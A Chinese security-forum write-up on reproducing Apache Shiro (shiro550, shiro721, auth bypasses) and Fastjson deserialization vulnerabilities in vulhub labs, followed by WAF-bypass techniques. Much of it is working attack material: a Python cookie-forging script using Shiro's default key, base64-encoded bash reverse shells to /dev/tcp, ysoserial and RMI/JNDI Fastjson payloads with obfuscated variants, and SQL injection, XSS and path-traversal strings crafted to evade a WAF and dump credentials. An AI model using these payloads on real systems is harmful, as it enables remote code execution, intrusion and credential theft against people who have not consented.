# shiro+fastjson整合利用

> **来源**: https://forum.butian.net/share/2980  
> **文章ID**: 2980

---

shiro +fastjson实操
=================

Shiro
-----

Apache Shiro提供了认证、授权、加密和会话管理功能，将复杂的问题隐藏起来，提供清晰直观的API使开发者可以很轻松地开发自己的程序安全代码。

Shiro将目标集中于Shiro开发团队所称的“四大安全基石”-认证（Authentication）、授权（Authorization）、会话管理（Session Management）和加密（Cryptography）

- 认证（Authentication）：用户身份识别。有时可看作为“登录（login）”，它是用户证明自己是谁的一个行为。
- 授权（Authorization）：访问控制过程，好比决定“认证（who）”可以访问“什么（what）”.
- 会话管理（SessionManagement）：管理用户的会话（sessions），甚至在没有WEB或EJB容器的环境中。管理用户与时间相关的状态。
- 加密（Cryptography）：使用加密算法保护数据更加安全，防止数据被偷窥。

@shiro:<https://github.com/vulhub/vulhub/tree/master/shiro>

### CVE-2010-3863：Apache Shiro 认证绕过漏洞

#### 漏洞原理

在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造/、//、/./、/…/ 等绕过权限验证。

#### 影响版本

```php
shiro < 1.1.0和JSecurity 0.9.x
```

#### 漏洞复现

访问页面地址为：IP:8080

漏洞点/admin  
使用跨目录测试字典fuzz

![image.png](images/attach-56a9ba14ce00d9a3facb12e93d8dca8b1123a835.png)

![image.png](images/attach-7fc42994037f6abacf191df0e9a78f2f97ba7d5a.png)

### CVE-2016-4437：Apache Shiro 1.2.4反序列化漏洞/shiro550

#### 漏洞原理

属于shiro550漏洞。

Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

shiro默认使用CookieRememberMeManager，对rememberMe的cookie做了加密处理，在CookieRememberMeManaer类中将cookie中rememberMe字段内容先后进行序列化、AES加密、Base64编码操作。在识别身份的时候，需要对Cookie里的rememberMe字段解密。根据加密的顺序可以推断出解密的顺序为获取==cookie-base64解码-AES解密-反序列化。==

#### 影响版本

Apache Shiro <= 1.2.4

#### 漏洞复现

判断一个页面的登录**是否使用了shiro框架**进行身份验证、授权、密码和会话管理。

判断方法：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样。

![image.png](images/attach-689e69b9a3a4c611d9fda7b87ce39c95fc1bad57.png)

![image.png](images/attach-b297bcadedf75280c07cabc68dd9f21b83fb65e1.png)

只要响应包中出现rememberMe=deleteMe字段就说明存在漏洞。这样说片面的，**如果出现rememberMe=deleteMe字段应该是仅仅能说明登录页面采用了shiro进行了身份验证而已，并非直接就说明存在漏洞**

- 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie里也没有deleteMe字段登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe 字段
- 不勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段。但是之后的所有请求中Cookie都不会有RememberMe字段
- 勾选RememberMe，登录成功的话，返回包set-Cookie里有rememberMe=deleteMe字段，还会有remember字段，之后的所有请求中Cookie都会有rememberMe字段
- 或者可以在cookie后面自己加—个rememberMe=1,看返回包有没有rememberMe= deleteMe

```php
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEyOS80NDQ0IDA+JjE=
```

```php
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjEyOS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}'
```

使用shiro-exploit.py获取shiro的默认key (工具地址：[https://github.com/insightglacier/Shiro\_exploit](https://github.com/insightglacier/Shiro_exploit))

![image.png](images/attach-34284e97a4e380ec67356ed70181b28e53f88eb7.png)

使用shiro.py生成payload(需要自己改key，shiro.py代码如下：)  
命令：`shiro.py 192.168.17.132:6666`  
shiro.py:

```php
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])   
print ("rememberMe={0}".format(payload.decode()))
```

python3 shiro.py 192.168.200.129:6666  
登录后抓包，替换数据包中的cookie值为shiro.py生成的rememberMe

![image.png](images/attach-ad344c626898d604b6c72032ba45d7044023f3cf.png)

### CVE-2020-1957：Apache Shiro 认证绕过漏洞

#### 漏洞原理

我们需要分析我们请求的URL在整个项目的传入传递过程。在使用了shiro的项目中，是我们请求的URL(URL1),进过shiro权限检验(URL2)，最后到springboot项目找到路由来处理(URL3)

漏洞的出现就在URL1，URL2和URL3 有可能不是同一个URL，这就导致我们能绕过shiro的校验，直接访问后端需要首选的URL。本例中的漏洞就是因为这个原因产生的。

Shiro框架通过拦截器功能来对用户访问权限进行控制，如anon, authc等拦截器。anon为匿名拦截器，不需要登录即可访问；authc为登录拦截器，需要登录才可以访问。

#### 影响版本

Apache Shiro < 1.5.2

#### 漏洞复现

![image.png](images/attach-162192c02cfbb0f5aebb2a40c3f55932a654c7de.png)

URL改为/admin会自动跳转到login登录页面

![image.png](images/attach-900b5bd09ba301e166cf4bac7903e5e714b738cc.png)

##### 构造恶意请求进行权限绕过

因为代码层面加上;就会识别成绕过 后面加个/也可以  
URL改为/xxx/...;/admin/绕过了登录，直接访问成功！

```php
/xxx/...;/admin/
```

![image.png](images/attach-f3e9ddf1d6f591441ce215869930dee2f7fdfa9f.png)

### Shiro 721

#### 漏洞复现：CVE-2019-12422

环境：kali linux  
docker进行搭建启动

```php
git clone https://github.com/3ndz/Shiro-721.git  
cd Shiro-721/Docker  
docker build -t shiro-721 .  
docker run -p 8080:8080 -d shiro-721
```

访问：

![image.png](images/attach-683d51bc760ccd8b56ca3ed3a89f28666fbb1d59.png)

![image.png](images/attach-d22fdc2048fb355729df983514e6950fe81288fb.png)

![image.png](images/attach-d567e417db09ec3e617248f3ba1e1fc50cf308f4.png)

**如果用正确的账号密码登录，则分别发送两个请求包，分别是POST和GET**  
**POST请求包如下图这是（正确账号密码登录得到的包）**

![image.png](images/attach-5e89bc56d0a2c2880d632441fc07ac76916e3bf9.png)

**GET请求包如下图（这是正确密码登录得到的包，主要是向后台提交cookie值）**

![image.png](images/attach-4796e3e0d644a05780ab1e8c1721fc7b00cbc4b8.png)  
**看到响应包里面有个rememberMe=deleteMe字段，可以说存在shiro反序列化漏洞**

![image.png](images/attach-9d9ca9c34a2c1e983afc176d794e3ff23383d679.png)  
burp插件增加HaE、Logger++可以查看shiro的指纹

![image.png](images/attach-c6ac4d974913a2e1c8d762d25eaba1e2c400b4e2.png)

![image.png](images/attach-ee983acf389f23ebdd13d5823b31fc20e9719631.png)

工具利用：

![image.png](images/attach-64b21b0f704bd4f5177922d6cdaf63f6c0061eec.png)

fastjson
--------

@fastjson:<https://github.com/vulhub/vulhub/tree/master/fastjson>

### 漏洞原理

该漏洞的原理在于Fastjson的反序列化机制。当Fastjson解析JSON数据时，它会尝试将JSON数据转换为Java对象。在这个过程中，Fastjson会根据JSON数据中的类型信息来确定如何解析数据。攻击者可以利用这一特性，在JSON中构造特定的数据类型和结构，使Fastjson在解析时调用恶意构造的Java类或方法，从而实现远程代码执行。

 一种常见的利用方式是利用Fastjson的autoType功能。autoType是Fastjson的一个特性，允许在序列化和反序列化时使用类的全限定名（fully qualified class name）。攻击者可以构造一个恶意的JSON数据，将恶意的类作为autoType的值，当Fastjson反序列化时，它会尝试实例化指定的类，从而执行该类中的代码(在漏洞利用过程中一般利用JdbcRowSetlmpl利用链)。

### @type字段

@type是Fastjson中用于处理对象类型信息的特殊字段之一。在JSON数据中，@type字段可以用来指定反序列化时应该实例化的类的类型。这个字段通常用于在反序列化时指定对象的类型信息，尤其是当Fastjson的autoType功能开启时。

 通过@type字段，Fastjson可以识别要实例化的类，并根据该字段中提供的类路径来创建对象。这在序列化和反序列化复杂对象结构时非常有用，因为它允许您指定对象的确切类型。

 然而，正是因为@type字段的存在和使用，恶意用户可能会利用这个字段来构造恶意的JSON数据，在@type字段中指定恶意类路径。这样一来，在反序列化过程中，Fastjson会根据@type字段指定的类路径尝试实例化对应的类，导致可能执行恶意代码或利用安全漏洞。

### JNDI

 JNDI、RMI和LDAP是 Java 中用于不同目的的技术.

- JNDI(Java Naming and Directory Interface)：JNDI 是 Java 中的一组 API，用于访问不同的命名和目录服务。JNDI 提供了一种统一的访问方式，允许 Java 应用程序连接和使用各种不同的命名和目录服务，如 DNS、LDAP、RMI 注册表等。JNDI 的目的是为了提供统一的访问方式，让 Java 应用程序能够利用不同服务的命名和目录功能。
- RMI(Remote Method Invocation)：RMI 是 Java 中用于实现远程方法调用的机制。它允许在不同的 Java 虚拟机之间进行对象间的通信和方法调用。在分布式系统中，RMI 允许远程系统之间调用彼此的方法，实现远程对象之间的交互。
- LDAP(Lightweight Directory Access Protocol）：LDAP 是一种用于访问分布式目录服务的协议。它通常用于存储结构化数据，如用户信息、组织架构等。在 Java 中，JNDI 提供了 LDAP 访问的支持，允许使用 JNDI 来连接和操作 LDAP 目录服务，比如进行用户认证、检索数据等。

 这些技术之间的关系在于 JNDI 作为一个 Java API，它提供了访问不同服务（包括 LDAP）的统一方式。通过 JNDI，可以连接和操作 LDAP 服务器，检索和存储 LDAP 目录中的数据。另外，JNDI 也可以用于查找 RMI 注册表中的远程对象，从而实现远程方法调用。

 总结来说，JNDI 作为 Java 中的一个 API，它提供了统一访问不同服务的方式，允许 Java 应用程序连接和操作 LDAP、RMI 注册表等不同的命名和目录服务。

### JdbcRowSetImpl利用链

在fastjson中我们使用`JdbcRowSetImpl`进行反序列化的攻击，`JdbcRowSetImpl`利用链的重点就在怎么调用`autoCommit`的set方法，而fastjson反序列化的特点就是会自动调用到类的set方法，所以会存在这个反序列化的问题。只要制定了`@type`的类型，他就会自动调用对应的类来解析。

这样我们就可以构造我们的利用链。在`@type`的类型为`JdbcRowSetImpl`类型的时候，JdbcRowSetImpl类就会进行实例化，那么只要将`dataSourceName`传给`lookup`方法，就可以保证能够访问到远程的攻击服务器，再使用设置`autoCommit`属性对lookup进行触发就可以了。整个过程如下：  
 通过设置`dataSourceName`将属性传参给`lookup`的方法—>设置`autoCommit`属性，利用`SetAutoCommit`函数触发connect函数—>触发`connect`函数下面`lookup`函数就会使用刚刚设置的`dataSourceName`参数，即可通过RMI访问到远程服务器，从而执行恶意指令。

exploit如下：

```php
{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”rmi://192.168.17.39:9999/Exploit”,”autoCommit”:true}
```

值得注意的是：1、`dataSourceName`需要放在`autoCommit`的前面，因为反序列化的时候是按先后顺序来set属性的，需要先`etDataSourceName`，然后再`setAutoCommit`。2、rmi的url后面跟上要获取的我们远程`factory`类名，因为在`lookup()`里面会提取路径下的名字作为要获取的类。

### fastjson探测版本

1、使用dnslog外带 最好用自己搭建的dnslog 因为dnslog大多都被写入黑名单内了  
2、**有报错信息，判断版本号** payload 都是没有读到 “{”和“,” 才进入缺陷代码块抛出了异常  
3、使用脚本快速探测版本号 也就是每个POC都打一遍有就有没有就没有

CVE-2017-18349 fastjson 1.2.24-rce
==================================

0x00 简介
-------

fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了

0x01 漏洞概述
---------

fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

0x02 影响版本
---------

影响范围：fastjson<=1.2.24

0x03 环境搭建
---------

```php
cd /vulhub/fastjson/1.2.24-rce
docker-compose up -d  
docker ps
```

![image.png](images/attach-0e4c7cd76c44cdd793e06f3c1a32547354d13efa.png)

docker开启的8090端口，访问靶机IP

```php
http://192.168.200.166:8090/
```

![image.png](images/attach-b8e3377b8f10a470d47de0753082b563f080fe2e.png)

#### JDK版本切换

漏洞利用需要jdk8，而kali自带的jdk是jdk11这里用不了，所以先卸载kali的jdk1123

```php
dpkg --list | grep -i jdk  #查看安装的jdk包
apt-get purge openjdk-*    #卸载openjdk相关包
dpkg --list | grep -i jdk  #检查所有jdk包都卸载完毕
```

下载jdk1.8  
<https://github.com/frekele/oracle-java/releases/download/8u212-b10/jdk-8u212-linux-x64.tar.gz>

![image.png](images/attach-33094e95c0b5018feb4c2f34ff7e5bb26c84d1a4.png)

将压缩包放入kali后解压、配置环境变量

```php
mv jdk-8u212-linux-x64.tar.gz /opt/java  #放置在/opt/java下
tar -zxvf jdk-8u212-linux-x64.tar.gz     #解压缩
#环境变量配置
leafpad /etc/profile
export JAVA_HOME=/opt/java/jdk1.8.0_212
export JRE_HOME=${JAVA_HOME}/jre
export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib
export PATH=${JAVA_HOME}/bin:${PATH}

#通知java的位置
#update-alternatives命令用于处理linux系统中软件版本的切换
sudo update-alternatives --install "/usr/bin/java" "java" "/opt/java/jdk1.8.0_212/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/opt/java/jdk1.8.0_212/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/opt/java/jdk1.8.0_212/bin/javaws" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/opt/java/jdk1.8.0_212/bin/javaws" 1

#设置默认JDK
sudo update-alternatives --set java /opt/java/jdk1.8.0_212/bin/java
sudo update-alternatives --set javac /opt/java/jdk1.8.0_212/bin/javac
sudo update-alternatives --set javaws /opt/java/jdk1.8.0_212/bin/javaws

#使环境变量生效
source /etc/profile

#检查是否安装成功
java -version
```

#### maven在kali上的安装

```php
apt-get install maven#安装MVN
mvn –version#查看是否安装成功
```

#### marshalsec安装

```php
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests  #编译
```

![image.png](images/attach-001cd6e863c948250efa5506d5225e3473cd5002.png)

0x04 漏洞复现
---------

> \[!靶机地址介绍\] Vulhub fastjson  
> 漏洞主机：192.168.200.166
> 
> \[!NOTE\] Kali  
> 接收反弹shell主机Kali 192.168.200.160
> 
> \[!666\] Windows  
> 运行恶意Java类的主机和含有RMI服务主机 win11 192.168.200.159

利用dnslog盲打  
构造以下payload，利用dnslog平台接收

```php
{"zeo":{"@type":"java.net.Inet4Address","val":"dnslog"}}
```

记得改json

![image.png](images/attach-e7b34379f25188471cdf647698f0310568f2b83f.png)

![image.png](images/attach-e63e16d0777d477373f0f94c3b8b5f71ae297fad.png)  
1.2.67版本后payload

```php
{"@type":"java.net.Inet4Address","val":"dnslog"}

{"@type":"java.net.Inet6Address","val":"dnslog"}

畸形：{"@type":"java.net.InetSocketAddress"{"address":,"val":"这里是dnslog"}}
```

工具下载

```php
https://github.com/zhzyker/exphub/tree/master/
```

![image.png](images/attach-a435e7807fac66e2b34c3a87e1f85af4a2c77ae2.png)

![image.png](images/attach-9adcf10b3b23438bd33899ad7e113aef02de5fab.png)

kali进行监听端口

```php
nc -lnvp 8888
```

物理机运行RMI服务，加载恶意java类

```php
bash -i >& /dev/tcp/192.168.177.128/8888 0>&1 //转换成可执行代码
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.177.1 9999 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xNjAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"
```

![image.png](images/attach-9cc3935133e1eda164cf40cc0905f1e9ce7e5162.png)

![image.png](images/attach-d6914ba4af272087998df00e0223f8a16f0a3f51.png)  
发送反序列化代码漏洞执行命令

```php
python.exe .\fastjson-1.2.24_rce.py http://192.168.200.166:8090 rmi://192.168.200.159:9999/Object
```

成功反弹shell

![image.png](images/attach-e0d99a9a905709d5d1b173e756f6e955f5fb7625.png)

0x05 修复方式
---------

升级最新版本，具体参见[漏洞修复](https://github.com/alibaba/fastjson/wiki/update_faq_20190722)

![image.png](images/attach-ea463e523ac1c4940591d55021d15517634bade0.png)  
原因：NAT 不能被第三方机器干扰  
桥接模式可以被干扰

CNVD‐2019‐22238 Fastjson 1.2.47 远程命令执行漏洞
========================================

0x00 简介
-------

Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。。

0x01 漏洞概述
---------

fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令

0x02 影响版本
---------

FastJson < 1.2.48

0x03 环境搭建
---------

启动 fastjson 反序列化导致任意命令执行漏洞 环境

```php
1.进入 vulhub 的 Fastjson 1.2.47 路径
cd /usr/local/tools/vulhub/fastjson/1.2.47-rce

2.编译并启动环境
docker-compose up -d

3.查看环境运行状态
docker ps | grep rce
```

0x04 漏洞复现
---------

fastjson提供了autotype功能，在请求过程中，我们可以在请求包中通过修改@type的值，来反序列化为指定的类型，而fastjson在反序列化过程中会设置和获取类中的属性，如果类中存在恶意方法，就会导致代码执行漏洞产生。

查看fastjson漏洞利用工具的pyload

```php
payload = """
    {
        "a": {
            "@type": "java.lang.Class", 
            "val": "com.sun.rowset.JdbcRowSetImpl"
        }, 
        "b": {
            "@type": "com.sun.rowset.JdbcRowSetImpl", 
            "dataSourceName": "%s", 
            "autoCommit": true
        }
    }
```

工具下载

```php
https://github.com/zhzyker/exphub/tree/master/
```

![image.png](images/attach-d523967a2eefa1bfa7f414b5fa2557886b8fa246.png)

```php
nc -lnvp 8888
```

物理机运行RMI服务，加载恶意java类  
//转换成可执行代码

```php
bash -i >& /dev/tcp/192.168.200.160/8888 0>&1
```

base64编码

```php
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xNjAvODg4OCAwPiYx
```

运行rmi服务

```php
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.200.159 9999 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzQuMjM1LjIwNi84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}"
```

![image.png](images/attach-3ae2fcb8688c44071c6ff3ced44bbc3d1d5ba087.png)  
发送反序列化代码漏洞执行命令

```php
python.exe fastjson-1.2.47_rce.py http://192.168.200.166:8090 rmi://192.168.200.159:9999/Object
```

![image.png](images/attach-7cdeb893402e33a27170ecac95d5da905cb2326a.png)

![image.png](images/attach-5575cd0c4ee6f8265ab3f9d508e47760c54f5ae9.png)

![image.png](images/attach-9e719562e84e62a8331d9e05a2b069909d18cb04.png)

0x05 修复方式
---------

更新到最新版本

常见绕WAF手法
========

安全狗安装:
------

<https://www.dianthink.com/detail/550.html>

```php
安装windows server
安装phpstudy
配置phpstudy+dvwa
安装安全狗windows版
如果提示找不到Apache服务，cmd进入到Apache路径中，httpd.exe -k install -n apache2
校验防护是否存在
关闭黑名单功能(IP黑白名单)。
关闭CC攻击防护（资源防护）
```

pikachu安装:
----------

<https://github.com/zhuifengshaonianhanlu/pikachu>

```php
pikachu 靶场搭建
[root ~]# unzip pikachu-master.zip -d /var/www/html/

[root ~]# vim /var/www/html/pikachu-master/inc/config.inc.php
改：
11 define('DBPW', '');
为：
11 define('DBPW', '123456');
```

Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。 利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。 而在日常的渗透测试当中，如果遇到了拥有WAF防护的网站，当发送带有payload的数据包被防火墙阻断时，则会失去快乐。 所以通过特定的方式绕过防护，是一项有意思的任务。但需要额外注意的是：BypassWAF与免杀是不同的。

一 WAF的不同类型
----------

WAF的工作流程图大致如下，可以简单的概况为：WAF在网站服务器前面提供一层过滤攻击流量的功能。

![image.png](images/attach-e2df7efbe540d2af0f619e948ca8ef9f08c8c385.png)

而WAF提供在部署的方式上，存在着不同的类型。概况下来大致存在三类：

```php
1、云WAF
2、铁盒子
3、软件类
```

二 BypassWAF的取巧型应对
-----------------

### 2.1 找到真实IP

在具有WAF的渗透测试场景中，网站的访问流程如下：

```c
终端用户-->WAF-->webserver
```

而如果通过修改hosts文件，将访问的流程进行调整，则可以直接跳过WAF的检测。

```c
终端用户-->webserver
```

所以寻找到真实IP在应对云WAF的场景中则会是很好用的策略。

寻找真实IP可以采用的思路有几种：

```php
1、通过fofa、shadon类的工具搜索title或其他关键字
2、DNS的解析历史
3、通过其他子站点推测
```

### 2.2 寻找无指纹漏洞

WAF在阻断的过程中，常常采用正则表达式或基于行为判定的方式进行阻断。为此WAF在对于没有指纹的攻击方式无能为力。

而常见的无指纹类攻击方式包括：逻辑漏洞、口令类漏洞、CSRF......

三 BypassWAF的男人型应对
-----------------

### 3.1 常用的Bypass方案

在BypassWAF的过程中，所使用的思路可以总结为以下三种方式：

```php
1 使WAF跳过输入验证
2 使WAF的解释与后端不一致
3 使WAF未检测到对应的规则
```

1 跳过参数验证：  
PHP从参数名中删除空格或将其转换为下划线

```php
http://xxx.com/test.php?%20testid=select 1,2,3
```

本来应该是？后直接id=，这里才让了%20test参数

ASP删除不后面跟着两个十六进制数字的%字符

```php
http://xxx.com/test.aspx?%testid=select 1,2,3
```

通过这种方式绕过不拒绝未知参数的WAF。

2 格式错误的HTTP请求方式  
配置错误的web服务器可能接受格式错误的HTTP请求方式，可以绕过仅限定定GET和POST方式的WAF。

```php
将GET改为hello
```

3 加载waf的负载  
如果WAF性能负载过重的情况下，可能会跳过输入验证。通常可以发送打了的恶意请求。

对于嵌入式WAF或许更适用。

4 HTTP参数污染

发送多个同名的参数，如：

[http://xxx.com/test/?test=1&test=2](http://xxx.com/test/?test=1&test=2)

```php
ASP.NET中，会处理成test=1,2
JSP中，会处理成test=1
PHP中，会处理成test=2
```

所以当payload为test=select 1,2,3 from tables的时候，可以将其改变为：

```php
test=select 1&select 2,3 from tables
```

5 双重URL编码  
WAF会将URL编码的字符规范化为ASCII文本，所以使用双重编码可能会导致绕过。

```c
s --> %73 -->%25%37%33
```

所以可以将payload修改成双重URL编码的格式

```javascript
1 union %25%37%33elect 1,2,3
```

6 使WAF未检测到对应的规则  
在找到缺少的规则方式中，需要有一定的流程设计，例如将waf部署好后，关闭拉黑的机制，然后进行fuzz的测试。

为此，整个的测试当中，如果以目的为导向的话，那么的目的是找到一条一句的方式，WAF不认为是恶意语句，但这条的恶意语句可以在网站中执行。

在SQL注入的绕过中，可以尝试的语法方式：

```c
###原本为 ’ or 1=1
or 9=9
or 0x47 = 0x47 -->ASCII
or char(32) = ''
or 9 is not null

###原本为 1+union+select+1,2,3/*
1/*union*/union/*select*/select+1,2,3/* 
1/*uniXon*/union/*selXect*/select+1,2,3/*
UNION ALL SELECT

###其他的绕过方式
id=-15 uNloN sELecT 1,2,3,4
id=-15 UNlunionON SELselectECT1,2,3,4 
id=1%252f%252a*/UNION%252f%252a/SELECT 
id=-15/*!u%6eion*/ /*!se%6cect*/ 1, 2,3,4...SELECT(extractvalue(ox3C613E61646D6g6É3C2F613E,ox2f61) 
id=10%D6'%20AND%201=2%23 - SELECT 'A'='A'; #1 
```

在xss中，可以尝试的语法方式：

```c
###原本为:Alert('xss')或Alert (1)
Prompt('xss')
Prompt(454)    
Confirm('xss') 
Confirm(123)
Alert(/xss/.source) 
Window[/alert/.source](8)

###原本为:alert(document['cookie'])
alert(document[/coo/.source+/kie/.source])
alert(document[/cookie/.source])
with(document)alert(cookie)
alert(document.cookie)

###原本为: < img src=x onerror=alert(1);> 或javascript:alert(document.cookie)
<svg/onload=alert(1)>
<video src=x onerror=alert(1);>
<audio src=x onerror=alert(1);>
Data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

在文件包含中，可以尝试的语法方式：

```php
###原本为:/etc/passwd
/too/abc/etc/far/.../passwd
/../../../../etc/passwd%oo
/etc//passwd
/etc/ignore/../passwd
/etc/passwd....
```

在文件上传中，可以尝试的方式：

```php
文件名的变化
webshell的免杀
```

### 3.2 环境的搭建

```php
安装windows server
安装phpstudy
配置phpstudy+dvwa
安装安全狗windows版
如果提示找不到Apache服务，cmd进入到Apache路径中，httpd.exe -k install -n apache2
校验防护是否存在
关闭黑名单功能(IP黑白名单)。
关闭CC攻击防护（资源防护）
```

Sql-Lab 安全狗拦截绕过
===============

首先打开sqllab的第一关  
这里%27代表单引号

```php
http://10.0.22.140/SQLL/Less-1/?id=1%27--+
```

![image.png](images/attach-c3aca744555f9677f410e65b1e3c6a7edbe54570.png)  
使用`order by`指令

```php
http://10.0.22.140/SQLL/Less-1/?id=1' order by 4--+
```

![image.png](images/attach-1aaecb0ec585cb92e348eb9eede30c3ae89e4b3a.png)

这里可以测出来一共存在三列，然后使用联合查询来试试

```php
http://10.0.22.140/SQLL/Less-1/?id=1' union select 1,2,3--+
```

![image.png](images/attach-f157299647502e27175385d30a4091a1c5fa92e2.png)  
如果只有union呢？试试

```php
http://10.0.22.140/SQLL/Less-1/?id=1' union  1,2,3--+
```

![image.png](images/attach-bb83de6aa987c02428888872dc30aba70de6986f.png)

select呢

```php
http://10.0.22.140/SQLL/Less-1/?id=1' union select 1,2,3--+
```

![image.png](images/attach-0ac6b41cc240a3acefff41b730a78ffaced9e863.png)  
得出union 和 select不能联用

select绕过

```php
%23进行#注释 
%0a换行符
/*!*/ 内联注释
%0a 换行
```

```php
http://10.0.22.140/SQLL/Less-1/?id=-1' union /*!%23%0aselect 1,2,3*/ --+
```

![image.png](images/attach-db91ccf30a13f10d8877099b6d8219ad905f63df.png)

### 测试database()

直接使用database()不行，那么在database()中间使用空格编码是不是就可以绕过了  
在这里经过多次测试之后发现，`database()`可以使用`database/**/()`进行绕过

```php
http://10.0.22.140/SQLL/Less-1/?id=-1' union /*!%23%0aselect 1,2,database/**/()*/ --+
```

![image.png](images/attach-23bf313b9d67b1a4f0ae78bdd0f7bb9212266646.png)  
此时已经获得了数据库名称为`security`

继续操作来进行下一步，直到能够获取所有的关键信息

现在已知数据库之后，开始获取数据库中的表信息：  
对第三个位置来获取表信息：

```php
http://10.0.22.140/SQLL/Less-1/?id=-1' union /*!%23%0aselect 1,2,group_concat(table_name) /*!%23/*%0afrom*/ information_schema.tables where table_schema='security'--+
```

![image.png](images/attach-3ded25402032b20d7f2eeda7c4f928086a824c9c.png)

#### 内联注释知识点

```php
-   /*!select*/:  相当于没有注释

-   /*!12345select*/: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。

-   /*![]*/: []中括号中的数字若填写则必须是5位
```

![image.png](images/attach-003c1c4b3231d43746111dcaa41211327ddc5871.png)

通过username password  
查看内容

```php
http://10.0.22.140/SQLL/Less-1/?id=-1' union /*!%23%0aselect 1,2,group_concat(concat_ws(0x7e, username, password)) /*!%23/*%0afrom*/ security.users--+
```

![image.png](images/attach-a39c5de1887dc70eb012495e0c7bbf3a57a339a4.png)

第二种小方法

```php
http://10.0.22.140/SQLL/Less-1/?id=  -1'  union   /*!00000%23%0aselect*/  1,2, group_concat(schema_name)  /*!00000%23/*%0afrom */ information_schema.schemata   --+
```

![image.png](images/attach-df6561a42d84471ab307a804772cff96ab0e2b62.png)

```php
?id= -1' union /*!00000%23%0aselect*/ 1,2, group_concat(table_name) /*!%23/*%0afrom*/ information_schema.tables where table_schema='security' --+
```

```php
?id= -1' union /*!00000%23%0aselect*/ 1,2, group_concat(column_name) /*!%23/*%0afrom*/ information_schema.columns where table_name='users' --+
```

```php
?id= -1' union /*!00000%23%0aselect*/ 1,2,group_concat(concat_ws(0x7e, username, password)) /*!%23/*%0afrom*/ security.users --+
```

fastjson绕waf
============

<https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-Unicode-Hex>  
● fastJson默认会对unicode和hex解码

```php
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
    ||
    ||
    \/
{"\x40\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

● `_和-绕过`  
FastJson在解析JSON字段的key时，会将\_和-替换为空；在1.2.36之前\_和-只能单独使用，在1.2.36及之后，支持\_和-混合使用。

```php
{"@type":"com.sun.rowset.JdbcRowSetImpl",'d_a_t_aSourceName':"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}
```

● 超⼤数据包⼀般都能绕过  
和SQL一样，WAF会放行数据字符过大的数据包

```php
{
    "@type":"org.example.User",
    "username":"1",
    "f":"a*20000"  //2万个a
}
```

绕过 WAF ，在部分中间件中，multipart 支持指定 Content-Transformer-Encoding 可以使用 Base64 或 quoted-printable （QP 编码） 来绕过 WAF

#### 大量字符绕过 WAF

```php
